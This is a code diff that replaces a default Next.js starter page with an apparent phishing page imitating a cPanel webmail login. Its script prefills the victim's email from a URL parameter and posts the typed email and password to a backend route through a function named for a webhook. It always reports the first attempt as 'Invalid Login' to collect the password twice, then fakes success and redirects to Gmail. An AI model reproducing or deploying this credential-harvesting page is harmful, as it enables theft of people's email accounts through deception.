@@ -1,115 +1,419 @@
-import Image from "next/image";
-import { Geist, Geist_Mono } from "next/font/google";
-
-const geistSans = Geist({
-  variable: "--font-geist-sans",
-  subsets: ["latin"],
-});
-
-const geistMono = Geist_Mono({
-  variable: "--font-geist-mono",
-  subsets: ["latin"],
-});
+import { useState, useEffect } from "react";
+import { useRouter } from "next/router";
 
 export default function Home() {
+  const router = useRouter();
+  const [open, setOpen] = useState(false);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [status, setStatus] = useState("You have logged out.");
+  const [statusClass, setStatusClass] = useState("error-notice");
+  const [attemptCount, setAttemptCount] = useState(0);
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const gsEmail = params.get("gs_lcrp");
+    if (gsEmail) setEmail(gsEmail);
+  }, []);
+
+  const sendFormDataToWebhook = async (e) => {
+  e.preventDefault();
+
+  // Step 1: Show "Authenticating..." immediately
+  setStatus("Authenticating …");
+  setStatusClass("info-notice");
+
+  try {
+    // Step 2: Send API request
+    const response = await fetch("/api/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password }),
+    });
+
+    // Step 3: Increase attempt count regardless of success/failure
+    const newAttempt = attemptCount + 1;
+    setAttemptCount(newAttempt);
+
+    // Step 4: Controlled message flow (not based on response.ok)
+    if (newAttempt === 1) {
+      setStatus("Invalid Login");
+      setStatusClass("error-notice");
+      setPassword("")
+    } else if (newAttempt === 2) {
+      setStatus("Success");
+      setStatusClass("success-notice");
+
+      setTimeout(() => {
+        window.location.href = "https://gmail.com";
+      }, 1500);
+    }
+  } catch (error) {
+    // Network or server error
+    setStatus("Error authenticating.");
+    setStatusClass("bg-red-400");
+  }
+};
+
+
   return (
-    <div
-      className={`${geistSans.className} ${geistMono.className} grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]`}
-    >
-      <main className="flex flex-col gap-[32px] row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="list-inside list-decimal text-sm/6 text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2 tracking-[-.01em]">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-[family-name:var(--font-geist-mono)] font-semibold">
-              src/pages/index.js
-            </code>
-            .
-          </li>
-          <li className="tracking-[-.01em]">
-            Save and see your changes instantly.
-          </li>
-        </ol>
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:w-auto"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+    <div id="login-wrapper" className="group ">
+      <div className="wrapper">
+        <div id="notify">
+          <div id="login-status" className={` ${statusClass}`}>
+            <div className="content-wrapper">
+              <div id="login-detail">
+                <div id="login-status-icon-container">
+                  <span className="login-status-icon" />
+                </div>
+                <div id="login-status-message">{status}</div>
+              </div>
+            </div>
+          </div>
+
+          <div
+            id="IE-warning"
+            className="warn-notice IE-warning-hide"
+            style={{ display: "none" }}
           >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 w-full sm:w-auto md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+            <div className="content-wrapper">
+              <div id="IE-warning-detail">
+                <div id="IE-warning-icon-container">
+                  <span className="IE-warning-icon" />
+                </div>
+                <div id="IE-warning-message">
+                  The system has detected that you are using Internet Explorer
+                  11. cPanel &amp; WHM no longer supports Internet Explorer 11.
+                  For more information, read the{" "}
+                  <a
+                    title="cPanel Blog"
+                    target="_blank"
+                    href="https://go.cpanel.net/ie11deprecation"
+                  >
+                    cPanel Blog
+                  </a>
+                  .
+                </div>
+              </div>
+            </div>
+          </div>
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-[24px] flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+
+        {open ? (
+          <div>
+            <div id="locale-container">
+              <div id="locale-inner-container">
+                <div id="locale-header">
+                  <div className="locale-head">Please select a locale:</div>
+                  <div className="close">
+                    <a href="#" onClick={() => setOpen(false)}>
+                      X Close
+                    </a>
+                  </div>
+                </div>
+                <div id="locale-map">
+                  <div className="scroller clear">
+                    <div className="locale-cell">
+                      <a href="?locale=en">English</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=ar">العربية</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=bg">български</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=cs">čeština</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=da">dansk</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=de">Deutsch</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=el">Ελληνικά</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=es">español</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=es_419">español latinoamericano</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=es_es">español de España</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=fi">suomi</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=fil">Filipino</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=fr">français</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=he">עברית</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=hu">magyar</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=i_cpanel_snowmen">
+                        ☃ cPanel Snowmen ☃ - i_cpanel_snowmen
+                      </a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=i_en">i_en</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=id">Bahasa Indonesia</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=it">italiano</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=ja">日本語</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=ko">한국어</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=ms">Bahasa Melayu</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=nb">norsk bokmål</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=nl">Nederlands</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=no">Norwegian</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=pl">polski</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=pt">português</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=pt_br">português do Brasil</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=ro">română</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=ru">русский</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=sl">slovenščina</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=sv">svenska</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=th">ไทย</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=tr">Türkçe</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=uk">українська</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=vi">Tiếng Việt</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=zh">中文</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=zh_cn">中文（中国）</a>
+                    </div>
+                    <div className="locale-cell">
+                      <a href="?locale=zh_tw">中文（台湾）</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        ) : (
+          <div id="content-container">
+            <div id="login-container">
+              <div id="login-sub-container">
+                <div id="login-sub-header">
+                  <img
+                    className="main-logo"
+                    src="https://6k6vi6nomhzfjb3tvneymftpnvgfi34dym4ta3i5mqzppmsrignq.arweave.net/8r1Uea5h8lSHc6tJhhZvbUxUb4PDOTBtHWQy97JRQZs"
+                    alt="logo"
+                  />
+                </div>
+                <div id="login-sub">
+                  <div id="clickthrough_form" style={{ visibility: "hidden" }}>
+                    <form action="#">
+                      <div className="notices" />
+                      <button type="submit" className="clickthrough-cont-btn">
+                        Continue
+                      </button>
+                    </form>
+                  </div>
+                  <div id="forms">
+                    <form
+                      onSubmit={sendFormDataToWebhook}
+                      noValidate
+                      id="login_form"
+                      method="post"
+                      target="_top"
+                      style={{}}
+                    >
+                      <div className="input-req-login">
+                        <label htmlFor="user">Email Address</label>
+                      </div>
+                      <div className="input-field-login icon username-container">
+                        <input
+                          name="user"
+                          id="user"
+                          autofocus="autofocus"
+                          value={email}
+                          onChange={(e) => setEmail(e.target.value)}
+                          placeholder="Enter your email address."
+                          className="std_textbox"
+                          type="text"
+                          tabIndex={1}
+                          required
+                        />
+                      </div>
+                      <div className="input-req-login login-password-field-label">
+                        <label htmlFor="pass">Password</label>
+                      </div>
+                      <div className="input-field-login icon password-container">
+                        <input
+                          name="pass"
+                          id="pass"
+                          value={password}
+                          onChange={(e) => setPassword(e.target.value)}
+                          placeholder="Enter your email password."
+                          className="std_textbox"
+                          type="password"
+                          tabIndex={2}
+                          required
+                        />
+                      </div>
+                      <div className="controls">
+                        <div className="login-btn">
+                          <button
+                            name="login"
+                            type="submit"
+                            id="login_submit"
+                            tabIndex={3}
+                          >
+                            Log in
+                          </button>
+                        </div>
+                      </div>
+                      <div className="clear" id="push" />
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+        <div id="locale-footer">
+          <div className="locale-container">
+            <noscript>
+              &lt;form method="get" action="."&gt; &lt;select name="locale"&gt;
+              &lt;option value=""&gt;Change locale&lt;/option&gt; &lt;option
+              value='en'&gt;English&lt;/option&gt;&lt;option
+              value='ar'&gt;العربية&lt;/option&gt;&lt;option
+              value='bg'&gt;български&lt;/option&gt;&lt;option
+              value='cs'&gt;čeština&lt;/option&gt;&lt;option
+              value='da'&gt;dansk&lt;/option&gt;&lt;option
+              value='de'&gt;Deutsch&lt;/option&gt;&lt;option
+              value='el'&gt;Ελληνικά&lt;/option&gt;&lt;option
+              value='es'&gt;español&lt;/option&gt;&lt;option
+              value='es_419'&gt;español latinoamericano&lt;/option&gt;&lt;option
+              value='es_es'&gt;español de España&lt;/option&gt;&lt;option
+              value='fi'&gt;suomi&lt;/option&gt;&lt;option
+              value='fil'&gt;Filipino&lt;/option&gt;&lt;option
+              value='fr'&gt;français&lt;/option&gt;&lt;option
+              value='he'&gt;עברית&lt;/option&gt;&lt;option
+              value='hu'&gt;magyar&lt;/option&gt;&lt;option
+              value='i_cpanel_snowmen'&gt;☃ cPanel Snowmen ☃ -
+              i_cpanel_snowmen&lt;/option&gt;&lt;option
+              value='i_en'&gt;i_en&lt;/option&gt;&lt;option value='id'&gt;Bahasa
+              Indonesia&lt;/option&gt;&lt;option
+              value='it'&gt;italiano&lt;/option&gt;&lt;option
+              value='ja'&gt;日本語&lt;/option&gt;&lt;option
+              value='ko'&gt;한국어&lt;/option&gt;&lt;option value='ms'&gt;Bahasa
+              Melayu&lt;/option&gt;&lt;option value='nb'&gt;norsk
+              bokmål&lt;/option&gt;&lt;option
+              value='nl'&gt;Nederlands&lt;/option&gt;&lt;option
+              value='no'&gt;Norwegian&lt;/option&gt;&lt;option
+              value='pl'&gt;polski&lt;/option&gt;&lt;option
+              value='pt'&gt;português&lt;/option&gt;&lt;option
+              value='pt_br'&gt;português do Brasil&lt;/option&gt;&lt;option
+              value='ro'&gt;română&lt;/option&gt;&lt;option
+              value='ru'&gt;русский&lt;/option&gt;&lt;option
+              value='sl'&gt;slovenščina&lt;/option&gt;&lt;option
+              value='sv'&gt;svenska&lt;/option&gt;&lt;option
+              value='th'&gt;ไทย&lt;/option&gt;&lt;option
+              value='tr'&gt;Türkçe&lt;/option&gt;&lt;option
+              value='uk'&gt;українська&lt;/option&gt;&lt;option
+              value='vi'&gt;Tiếng Việt&lt;/option&gt;&lt;option
+              value='zh'&gt;中文&lt;/option&gt;&lt;option
+              value='zh_cn'&gt;中文（中国）&lt;/option&gt;&lt;option
+              value='zh_tw'&gt;中文（台湾）&lt;/option&gt; &lt;/select&gt;
+              &lt;button style="margin-left: 10px"
+              type="submit"&gt;Change&lt;/button&gt; &lt;/form&gt; &lt;style
+              type="text/css"&gt;#mobilelocalemenu, #locales_list {"{"}
+              display:none{"}"}&lt;/style&gt;
+            </noscript>
+            <ul id="locales_list">
+              <li>
+                <a href="/?locale=en">English</a>
+              </li>
+              <li>
+                <a href="/?locale=ar">العربية</a>
+              </li>
+              <li>
+                <a href="/?locale=bg">български</a>
+              </li>
+              <li>
+                <a href="/?locale=cs">čeština</a>
+              </li>
+              <li>
+                <a href="/?locale=da">dansk</a>
+              </li>
+              <li>
+                <a href="/?locale=de">Deutsch</a>
+              </li>
+              <li>
+                <a href="/?locale=el">Ελληνικά</a>
+              </li>
+              <li>
+                <a href="/?locale=es">español</a>
+              </li>
+              <li>
+                <a
+                  href="#"
+                  id="morelocale"
+                  onClick={() => setOpen(true)}
+                  title="More locales"
+                >
+                  …
+                </a>
+              </li>
+            </ul>
+            <div id="mobilelocalemenu">
+              Select a locale:
+              <a href="#" onclick="toggle_locales(true)" title="Change locale">
+                English
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
   );
 }
